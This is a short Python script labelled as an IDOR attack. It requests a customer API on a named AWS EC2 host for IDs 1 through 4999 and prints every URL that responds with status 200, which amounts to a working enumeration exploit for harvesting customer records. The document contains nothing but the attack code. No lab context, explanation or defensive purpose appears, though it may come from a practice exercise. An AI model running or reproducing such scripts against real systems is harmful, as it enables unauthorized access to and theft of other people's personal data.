#IDOR attack
import requests

for i in range(1,5000):
    myurl = f"http://ec2-3-108-196-161.ap-south-1.compute.amazonaws.com/api/get-customer?id={i}"
    req = requests.get(url=myurl)
    if req.status_code == 200:
        print(myurl)